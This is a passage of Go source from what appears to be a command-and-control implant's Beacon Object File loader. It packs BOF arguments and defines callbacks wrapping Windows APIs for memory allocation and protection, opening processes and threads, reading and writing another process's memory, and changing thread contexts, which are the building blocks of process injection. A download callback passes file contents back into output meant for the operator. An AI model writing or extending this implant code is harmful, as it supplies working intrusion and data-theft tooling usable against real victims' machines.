		return beaconGetSyscallInformationCb
	default:
		return genericStubCb
	}
}

func ClearKeyStore() {
	keyStoreLock.Lock()
	keyStore = make(map[string]uintptr)
	keyStoreLock.Unlock()
}

func PackBofArgs(args []string) ([]byte, error) {
	if len(args) == 0 {
		return nil, nil
	}

	var buff []byte
	for _, arg := range args {
		if len(arg) == 0 {
			continue
		}

		prefix := arg[0]
		value := ""
		if len(arg) > 1 {
			value = arg[1:]
		}

		var packed []byte
		var err error

		switch prefix {
		case 'b':
			packed, err = packBinaryArg(value)
		case 'i':
			packed, err = packIntArg(value)
		case 's':
			packed, err = packShortArg(value)
		case 'z':
			packed, err = packStringArg(value)
		case 'Z':
			packed, err = packWideStringArg(value)
		default:
			packed, err = packStringArg(arg)
		}

		if err != nil {
			return nil, err
		}
		buff = append(buff, packed...)
	}

	result := make([]byte, 4)
	binary.LittleEndian.PutUint32(result, uint32(len(buff)))
	result = append(result, buff...)
	return result, nil
}

func packBinaryArg(data string) ([]byte, error) {
	hexData := make([]byte, len(data)/2)
	for i := 0; i < len(data)/2; i++ {
		var b byte
		_, err := fmt.Sscanf(data[i*2:i*2+2], "%02x", &b)
		if err != nil {
			return nil, err
		}
		hexData[i] = b
	}
	buff := make([]byte, 4)
	binary.LittleEndian.PutUint32(buff, uint32(len(hexData)))
	buff = append(buff, hexData...)
	return buff, nil
}

func packIntArg(s string) ([]byte, error) {
	var i uint32
	_, err := fmt.Sscanf(s, "%d", &i)
	if err != nil {
		return nil, err
	}
	buff := make([]byte, 4)
	binary.LittleEndian.PutUint32(buff, i)
	return buff, nil
}

func packShortArg(s string) ([]byte, error) {
	var i uint16
	_, err := fmt.Sscanf(s, "%d", &i)
	if err != nil {
		return nil, err
	}
	buff := make([]byte, 2)
	binary.LittleEndian.PutUint16(buff, i)
	return buff, nil
}

func packStringArg(s string) ([]byte, error) {
	strBytes := append([]byte(s), 0)
	buff := make([]byte, 4)
	binary.LittleEndian.PutUint32(buff, uint32(len(strBytes)))
	buff = append(buff, strBytes...)
	return buff, nil
}

func packWideStringArg(s string) ([]byte, error) {

	runes := []rune(s)
	buf := make([]byte, (len(runes)+1)*2)
	for i, r := range runes {
		binary.LittleEndian.PutUint16(buf[i*2:], uint16(r))
	}

	result := make([]byte, 4)
	binary.LittleEndian.PutUint32(result, uint32(len(buf)))
	result = append(result, buf...)
	return result, nil
}

func beaconDataLongCallback(parser uintptr) uintptr {
	if parser == 0 {
		return 0
	}

	p := (*datap)(unsafe.Pointer(parser))
	if p.length < 8 || p.buffer == 0 {
		return 0
	}

	val := *(*uint64)(unsafe.Pointer(p.buffer))

	p.buffer += 8
	p.length -= 8

	return uintptr(val)
}

func beaconDataPtrCallback(parser uintptr, size int32) uintptr {
	if parser == 0 {
		return 0
	}

	p := (*datap)(unsafe.Pointer(parser))
	if p.length < uint32(size) || p.buffer == 0 {
		return 0
	}

	ptr := p.buffer

	p.buffer += uintptr(size)
	p.length -= uint32(size)

	return ptr
}

func beaconDownloadCallback(filenamePtr uintptr, bufferPtr uintptr, length uint32) uintptr {
	if filenamePtr == 0 || bufferPtr == 0 || length == 0 {
		return 0
	}

	filename := readCString(filenamePtr)
	data := unsafe.Slice((*byte)(unsafe.Pointer(bufferPtr)), length)

	// We format the download as a special output application frame so the server can potentially parse it,
	// or at least it's visible to the user.
	// Format: [DOWNLOAD:filename:length]
	// data...

	header := fmt.Sprintf("\n[DOWNLOAD:%s:%d]\n", filename, length)

	bofOutput.Lock()
	defer bofOutput.Unlock()

	if bofOutput.buf == nil {
		return 0
	}

	remaining := len(bofOutput.buf) - bofOutput.len
	if len(header) > remaining {
		copy(bofOutput.buf[bofOutput.len:], header[:remaining])
		bofOutput.len += remaining
		return 1
	}
	copy(bofOutput.buf[bofOutput.len:], header)
	bofOutput.len += len(header)
	remaining = len(bofOutput.buf) - bofOutput.len
	toCopy := int(length)
	if toCopy > remaining {
		toCopy = remaining
	}

	if toCopy > 0 {
		copy(bofOutput.buf[bofOutput.len:], data[:toCopy])
		bofOutput.len += toCopy
	}

	if bofOutput.len < len(bofOutput.buf) {
		bofOutput.buf[bofOutput.len] = '\n'
		bofOutput.len++
	}

	return 1
}

func beaconVirtualAllocCallback(lpAddress uintptr, dwSize uintptr, flAllocationType uint32, flProtect uint32) uintptr {
	ret, _, _ := wc.Call("kernel32.dll", "VirtualAlloc", lpAddress, dwSize, uintptr(flAllocationType), uintptr(flProtect))
	return ret
}

func beaconVirtualProtectCallback(lpAddress uintptr, dwSize uintptr, flNewProtect uint32, lpflOldProtect uintptr) uintptr {
	ret, _, _ := wc.Call("kernel32.dll", "VirtualProtect", lpAddress, dwSize, uintptr(flNewProtect), lpflOldProtect)
	return ret
}

func beaconVirtualFreeCallback(lpAddress uintptr, dwSize uintptr, dwFreeType uint32) uintptr {
	ret, _, _ := wc.Call("kernel32.dll", "VirtualFree", lpAddress, dwSize, uintptr(dwFreeType))
	return ret
}

func beaconOpenProcessCallback(dwDesiredAccess uint32, bInheritHandle int32, dwProcessId uint32) uintptr {
	ret, _, _ := wc.Call("kernel32.dll", "OpenProcess", uintptr(dwDesiredAccess), uintptr(bInheritHandle), uintptr(dwProcessId))
	return ret
}

func beaconCloseHandleCallback(hObject uintptr) uintptr {
	ret, _, _ := wc.Call("kernel32.dll", "CloseHandle", hObject)
	return ret
}

func beaconGetThreadContextCallback(hThread uintptr, lpContext uintptr) uintptr {
	ret, _, _ := wc.Call("kernel32.dll", "GetThreadContext", hThread, lpContext)
	return ret
}

func beaconSetThreadContextCallback(hThread uintptr, lpContext uintptr) uintptr {
	ret, _, _ := wc.Call("kernel32.dll", "SetThreadContext", hThread, lpContext)
	return ret
}

func beaconResumeThreadCallback(hThread uintptr) uintptr {
	ret, _, _ := wc.Call("kernel32.dll", "ResumeThread", hThread)
	return ret
}

func beaconOpenThreadCallback(dwDesiredAccess uint32, bInheritHandle int32, dwThreadId uint32) uintptr {
	ret, _, _ := wc.Call("kernel32.dll", "OpenThread", uintptr(dwDesiredAccess), uintptr(bInheritHandle), uintptr(dwThreadId))
	return ret
}

func beaconReadProcessMemoryCallback(hProcess uintptr, lpBaseAddress uintptr, lpBuffer uintptr, nSize uintptr, lpNumberOfBytesRead uintptr) uintptr {
	ret, _, _ := wc.Call("kernel32.dll", "ReadProcessMemory", hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead)
	return ret
}

func beaconWriteProcessMemoryCallback(hProcess uintptr, lpBaseAddress uintptr, lpBuffer uintptr, nSize uintptr, lpNumberOfBytesWritten uintptr) uintptr {
	ret, _, _ := wc.Call("kernel32.dll", "WriteProcessMemory", hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)
	return ret
}

func beaconUnmapViewOfFileCallback(lpBaseAddress uintptr) uintptr {
	ret, _, _ := wc.Call("kernel32.dll", "UnmapViewOfFile", lpBaseAddress)
	return ret
}

func beaconVirtualQueryCallback(lpAddress uintptr, lpBuffer uintptr, dwLength uintptr) uintptr {
	ret, _, _ := wc.Call("kernel32.dll", "VirtualQuery", lpAddress, lpBuffer, dwLength)
	return ret
}

func beaconDuplicateHandleCallback(hSourceProcessHandle uintptr, hSourceHandle uintptr, hTargetProcessHandle uintptr, lpTargetHandle uintptr, dwDesiredAccess uint32, bInheritHandle int32, dwOptions uint32) uintptr {
	ret, _, _ := wc.Call("kernel32.dll", "DuplicateHandle", hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, uintptr(dwDesiredAccess), uintptr(bInheritHandle), uintptr(dwOptions))
	return ret
}

func beaconGetCustomUserDataCallback() uintptr {
	// no op until needed maybe one day
	return uintptr(unsafe.Pointer(&userDataBuf[0]))
}

func beaconGetSyscallInformationCallback(info uintptr, resolveIfNotInitialized int32) uintptr {
	// we already resolve all syscalls for the beacon in the loading stage (stagers/loader),
	// so this functions returns 0 (FALSE) as we don't need to expose internal syscall info to BOFs.
	return 0
}
